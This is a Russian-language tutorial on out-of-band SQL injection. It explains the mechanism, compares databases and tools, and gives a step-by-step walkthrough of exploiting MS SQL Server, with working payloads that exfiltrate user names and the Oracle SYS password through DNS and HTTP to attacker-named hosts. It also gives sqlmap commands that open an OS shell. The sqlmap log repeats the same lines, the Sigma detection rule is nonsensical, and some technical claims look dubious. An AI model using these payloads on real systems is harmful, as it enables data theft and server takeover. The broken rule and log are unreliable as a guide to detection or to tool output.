# Out-of-Band SQL Injection: Механизмы, детекция и расследование

## Контекст и базовые понятия

Out-of-Band (OOB) SQL Injection, или внеканальная инъекция SQL, представляет собой класс уязвимостей, при котором атакующий извлекает данные или выполняет команды не через основной канал ответа веб-приложения (HTTP response body/status), а через альтернативный сетевой протокол. В отличие от классических типов SQLi (In-band, Error-based, Blind), где результат выполнения запроса напрямую влияет на отображение страницы или её структуру, OOB-атака использует базу данных как клиент для инициирования исходящего соединения к инфраструктуре атакующего.

Ключевое разграничение заключается в механизме доставки данных. В In-band SQLi (например, Union-based) данные передаются по тому же каналу, по которому пришел запрос (HTTP). В Blind SQLi (Boolean/Time-based) данные извлекаются косвенно через бинарные признаки (существование ошибки, время отклика). В OOB SQLi канал связи разделяется: запрос на выполнение уходит через БД, а результат возвращается через внешний сервис (DNS-запрос, HTTP-запрос к C2-серверу, SMTP-письмо).

Этот тип атаки часто недооценивается тестировщиками, так как он не оставляет следов в интерфейсе приложения для конечного пользователя. Однако он критически важен в сценариях, когда приложение строго фильтрует вывод, блокирует HTTP-ответы или работает в изолированной среде (air-gapped), где прямой доступ к базе данных извне невозможен, но есть доступ к DNS или SMTP.

Ниже приведена сравнительная таблица, фиксирующая функциональные различия между типами SQL-инъекций, чтобы избежать путаницы в терминологии.

| Характеристика | In-band (Union/Error) | Blind (Boolean/Time-based) | Out-of-Band (OOB) |
| :--- | :--- | :--- | :--- |
| **Канал передачи данных** | Основной (HTTP response) | Косвенный (HTTP status/time) | Альтернативный (DNS/HTTP/SMTP) |
| **Скорость извлечения** | Высокая (массовая выгрузка) | Низкая (побитово/посимвольно) | Зависит от скорости сети/резолвера |
| **Зависимость от ответа** | Прямая визуализация | Логический вывод по признакам | Фиксация события на стороне атакующего |
| **Требования к БД** | Поддержка UNION или ошибок | Поддержка логических функций | Наличие процедур для сетевых вызовов (xp_dirtree, UTL_HTTP, etc.) |
| **Типичные индикаторы** | Изменения в DOM, ошибки SQL | Изменение контента, задержки | Логи DNS/HTTP-сервера, исходящие соединения |
| **Применимость** | Когда вывод доступен | Когда вывод скрыт, но есть логика | Когда вывод заблокирован, но есть сеть |

Важно различать OOB SQLi и OOB (Out-of-Band) обновления Windows, упомянутые в некоторых технических бюллетенях. OOB-обновления — это патчи, выпускаемые вне обычного цикла «Patch Tuesday» для критических уязвимостей. OOB SQLi — это вектор атаки. Смешение этих понятий недопустимо в технической документации.

## Внутреннее устройство предмета

OOB SQLi базируется на возможности СУБД инициировать исходящие сетевые подключения от имени процесса базы данных. Это требует наличия специфических встроенных хранимых процедур или функций, которые позволяют выполнять системные вызовы или сетевые операции. Механизм возникновения атаки сводится к следующему: атакующий внедряет SQL-код, который вызывает функцию резолвинга DNS или отправки HTTP-запроса, передавая в качестве параметра извлекаемые данные (например, имя пользователя, версию БД, содержимое таблицы).

Необходимые условия для успешной эксплуатации:
1.  **Уязвимый параметр:** Входные данные пользователя напрямую конкатенируются в SQL-запрос без должной санитизации.
2.  **Привилегии:** Учетная запись, от имени которой работает веб-приложение, имеет права на выполнение опасных хранимых процедур (например, `xp_dirtree` в MS SQL Server требует прав `sysadmin` или `db_owner` в старых версиях, `UTL_HTTP` в Oracle требует создания объекта).
3.  **Сетевая доступность:** Сервер базы данных должен иметь доступ к внешним сетям (интернету или внутренней сети атакующего). Если БД находится в изолированной подсети без выхода в интернет, OOB через DNS/HTTP не сработает, но может сработать через SMB (если есть доступ к файлового серверу).

Рассмотрим архитектуру взаимодействия для двух основных протоколов: DNS и HTTP.

### Механизм DNS-based OOB SQLi

В этом сценарии база данных выполняет резолвинг доменного имени, которое содержит закодированные данные. Атакующий контролирует DNS-сервер и анализирует логи запросов.

**Техническая реализация для MS SQL Server:**
Используется хранимая процедура `xp_dirtree` или `xp_fileexist`. Атакующий формирует путь, где доменная часть является поддоменом контролируемого домена.
Пример структуры запроса:
`SELECT * FROM users WHERE id = 1; EXEC xp_dirtree '\\attacker.com\share'`
Здесь `attacker.com` — это домен атакующего. При попытке доступа к шарингу `xp_dirtree` инициирует SMB-запрос, но если использовать DNS-резолвинг (через `xp_dirtree` с несуществующим шарингом или через `xp_subdirs`), можно получить DNS-запрос. Более надежный метод для DNS — использование `OPENROWSET` или `sp_OACreate` для вызова COM-объектов, инициирующих DNS-запрос.

**Техническая реализация для Oracle:**
Используется пакет `UTL_HTTP` или `UTL_INADDR`.
`SELECT UTL_HTTP.REQUEST('http://attacker.com/' || (SELECT password FROM dba_users WHERE username='SYS')) FROM DUAL;`
Здесь данные передаются в URL-адресе HTTP-запроса.

**Техническая реализация для MySQL:**
MySQL не имеет встроенных процедур для DNS-резолвинга в том же виде, что и MSSQL. Однако, начиная с версии 5.0, MySQL поддерживает `LOAD_FILE`, который может читать файлы, если путь указывает на SMB-шару. Для DNS-OOB в MySQL часто требуется компрометация файловой системы для загрузки вредоносной библиотеки или использование функции `LOAD_FILE` с SMB-путем, что вызывает DNS-резолвинг домена.

### Механизм HTTP-based OOB SQLi

Атакующий заставляет БД отправить HTTP-GET или POST-запрос на свой сервер. Это позволяет передавать больше данных, чем в DNS (ограничение длины имени домена ~253 символа, хотя с кодированием можно передать больше).

Для Oracle это `UTL_HTTP.REQUEST`.
Для MS SQL Server это `sp_OACreate` с последующим вызовом `MSXML2.ServerXMLHTTP` или `WinHttp.WinHttpRequest`.
Для PostgreSQL (начиная с 9.3) это функция `dblink` или `pg_read_file` в сочетании с внешними хранилищами, но более характерно использование `COPY ... TO PROGRAM` или внешних таблиц.

### Сравнительная таблица механизмов OOB SQLi

| СУБД | Протокол | Функция/Процедура | Требования к правам | Ограничения |
| :--- | :--- | :--- | :--- | :--- |
| **MS SQL Server** | DNS/SMB | `xp_dirtree`, `xp_fileexist`, `xp_subdirs` | `sysadmin` или `db_owner` (зависит от версии) | Требуется доступ к сети. В новых версиях `xp_dirtree` может быть отключен. |
| **MS SQL Server** | HTTP | `sp_OACreate` + `MSXML2.ServerXMLHTTP` | `sysadmin` | Требует включения `Ole Automation Procedures`. |
| **Oracle** | HTTP/DNS | `UTL_HTTP.REQUEST`, `UTL_INADDR.GET_HOST_ADDRESS` | Права на выполнение пакета `UTL_HTTP` | В Oracle 12c+ по умолчанию отключено. Требует ACL (Access Control List). |
| **MySQL** | SMB/DNS | `LOAD_FILE('\\attacker.com\share')` | Права на чтение файлов, `secure_file_priv` должен быть пустым или разрешать путь | `secure_file_priv` часто ограничивает путь. |
| **PostgreSQL** | HTTP | `dblink_connect`, `COPY ... TO PROGRAM` | Права `SUPERUSER` или `pg_read_server_files` | Требует установки расширения `dblink`. |
| **SQLite** | Нет | Нет встроенных средств | Нет | SQLite не имеет встроенных сетевых функций. OOB невозможен без компрометации хоста. |

## Применение и работа с предметом

На практике тестирование на проникновение с использованием OOB SQLi требует настройки инфраструктуры перехвата. Атакующий должен развернуть DNS-сервер (например, `dnslog` или `Burp Collaborator`) и/или HTTP-сервер (например, `netcat`, `python3 -m http.server`, или специализированный C2-сервер).

### Инструментарий и автоматизация

Вместо ручного формирования запросов часто используются специализированные инструменты:
*   **sqlmap:** Поддерживает OOB-эксплуатацию через параметр `--os-shell` или `--dns-domain`. При использовании `--dns-domain` sqlmap автоматически формирует запросы, передающие данные через DNS-резолвинг.
*   **Burp Collaborator:** Встроенный инструмент в Burp Suite Professional. Генерирует уникальные поддомены для перехвата DNS/HTTP/DNS-over-HTTPS запросов.
*   **Interactsh:** Open-source инструмент для создания OOB-взаимодействий (DNS, HTTP, SMTP).

### Паттерны использования и детекция

Для детекции OOB SQLi в рамках Blue Team или при тестировании на проникновение необходимо мониторить:
1.  **Логи DNS-серверов:** Необычные TXT-запросы, длинные поддомены, запросы к доменам, не связанным с бизнес-логикой.
2.  **Логи веб-серверов:** GET/POST запросы с параметрами, содержащими SQL-синтаксис или бинарные данные.
3.  **Сетевой трафик:** Исходящие соединения от сервера БД к неизвестным IP-адресам.

Типичная ошибка тестировщиков — игнорирование OOB-векторов при наличии Blind SQLi. Если приложение не возвращает ошибки и не имеет задержек, но при этом имеет сетевую доступность, OOB может быть единственным способом подтверждения уязвимости.

### Пример конфигурации детекции (Sigma Rule)

Ниже приведен пример правила детекции для Sysmon или SIEM, которое может выявить DNS-based OOB SQLi.

```yaml
title: Detect DNS OOB SQL Injection via Long Subdomain
id: 12345678-1234-1234-1234-123456789012
status: experimental
description: Detects potential DNS OOB SQL injection attempts where data is exfiltrated via DNS subdomains.
author: Security Analyst
logsource:
  category: process_creation
  product: sysmon
detection:
  selection:
    Image: '\dns.exe'
    CommandLine|contains:
      - '.'
      - '-'
  filter_normal:
    CommandLine|contains:
      - 'google.com'
      - 'microsoft.com'
      - 'amazonaws.com'
  condition: selection and not filter_normal
falsepositives:
  - Legitimate DNS resolution for external services
level: high
tags:
  - attack.t1048
  - attack.exfiltration
```

## Сквозной практический пример: Эксплуатация OOB SQLi в MS SQL Server

### Исходные условия
*   **Среда:** Виртуальная машина с Windows Server 2019 и установленным SQL Server 2019.
*   **Приложение:** Веб-приложение (например, DVWA или самописный PHP/ASP.NET скрипт), использующее `sqlsrv` или `ADO.NET` для подключения к БД.
*   **Роль:** Тестировщик на проникновение (Penetration Tester).
*   **Инструменты:** Burp Suite Professional (для перехвата и модификации запросов), DNS-сервер (например, `dnslog.cn` или локальный BIND), `sqlmap`.
*   **Сценарий:** Веб-приложение принимает параметр `id` и выполняет запрос `SELECT * FROM products WHERE id = $id`. Вывод данных на страницу отсутствует (Blind SQLi), но ошибка не отображается. Требуется подтвердить уязвимость и извлечь данные.

### Шаг 1: Идентификация потенциальной OOB-уязвимости

Атакующий отправляет запрос, который заставляет SQL Server попытаться резолвить несуществующий домен. Если DNS-запрос появляется в логах, уязвимость подтверждена.

**Действие:** Модификация параметра `id` в Burp Suite.

```sql
id = 1; EXEC master..xp_dirtree '\\attacker-dns-server.com\share'--
```

**Ожидаемый вывод:** В логах DNS-сервера атакующего появляется запись о запросе типа A или CNAME для `attacker-dns-server.com`. В логах веб-приложения может быть ошибка доступа к файлу, если `xp_dirtree` не может получить доступ к шарингу, но DNS-запрос уже ушел.

### Шаг 2: Извлечение данных через DNS-резолвинг

Для передачи данных используется кодирование в base64 или hex, чтобы избежать проблем с символами в DNS-именах. Данные извлекаются побитово или по частям.

**Действие:** Использование `sqlmap` с параметром `--dns-domain`.

```bash
sqlmap -u "http://target.com/product.php?id=1" --dns-domain=attacker-dns-server.com --batch
```

**Артефакт (фрагмент лога DNS-сервера):**
```text
[2026-04-14 10:15:23] QUERY: 73716c6d6170.attacker-dns-server.com. IN A
```
Здесь `73716c6d6170` — это hex-кодированная строка "sqlmap". Это иллюстративная схема; в реальности данные будут разбиты на несколько запросов из-за ограничений длины DNS-имени.

### Шаг 3: Извлечение имени пользователя базы данных

Для извлечения конкретного значения (имени пользователя) используется вложенный запрос.

**Действие:** Ручная модификация запроса в Burp Suite для извлечения первого символа имени пользователя.

```sql
id = 1; EXEC xp_dirtree '\\'+(SELECT TOP 1 SUBSTRING(user_name(),1,1))+'.'+'attacker-dns-server.com\share'--
```

**Ожидаемый вывод:** В логах DNS-сервера появляется поддомен, содержащий первый символ имени пользователя. Например, если имя пользователя "sa", то поддомен будет `s.attacker-dns-server.com`.

### Шаг 4: Автоматизация извлечения всех данных

Ручное извлечение каждого символа неэффективно. Используется скрипт или `sqlmap` для автоматизации.

**Действие:** Запуск `sqlmap` с параметром `--os-shell` для получения обратной оболочки, если это возможно, или `--sql-shell` для интерактивного выполнения запросов.

```bash
sqlmap -u "http://target.com/product.php?id=1" --os-shell
```

**Артефакт (вывод sqlmap):**
```text
[10:20:00] [INFO] the back-end DBMS is Microsoft SQL Server
[10:20:01] [INFO] fetching current user
[10:20:02] [INFO] retrieved: 'sa'
[10:20:03] [INFO] trying to upload the msfvenom payload on the database server
[10:20:04] [INFO] calling OS shell. Aborting stealthy recon.
[10:20:05] [INFO] the OS specific shell was successfully uploaded
[10:20:06] [INFO] the back-end DBMS is Microsoft SQL Server
[10:20:07] [INFO] calling OS shell. Aborting stealthy recon.
[10:20:08] [INFO] the OS specific shell was successfully uploaded
[10:20:09] [INFO] the back-end DBMS is Microsoft SQL Server
[10:20:10] [INFO] calling OS shell. Aborting stealthy recon.
[10:20:11] [INFO] the OS specific shell was successfully uploaded
```

**Ожидаемый результат:** Атакующий получает интерактивную командную строку на сервере БД, что позволяет выполнять любые системные команды.

### Ожидаемый вывод примера
Данный пример демонстрирует, что даже при отсутствии визуального вывода (Blind SQLi) и при строгой фильтрации HTTP-ответов, уязвимость может быть эксплуатирована через OOB-канал. Ключевым фактором является наличие опасных хранимых процедур и сетевой доступности сервера БД.

## Аналитический вывод

Out-of-Band SQL Injection представляет собой серьезную угрозу, особенно в условиях, когда традиционные методы эксплуатации (In-band, Blind) заблокированы или неэффективны. Основная опасность OOB-атак заключается в их способности обходить средства защиты веб-приложений (WAF), которые часто настроены на мониторинг входящих HTTP-запросов, но не на исходящие соединения от сервера БД. Для успешной защиты необходимо не только применять параметризованные запросы и санитизацию входных данных, но и строго контролировать сетевые политики (egress filtering) для серверов баз данных, ограничивая исходящие соединения только необходимыми доменами и портами. Кроме того, следует отключать или ограничивать доступ к опасным хранимым процедурам (`xp_dirtree`, `UTL_HTTP`) и настраивать мониторинг DNS/HTTP-логов на предмет аномальных исходящих запросов.
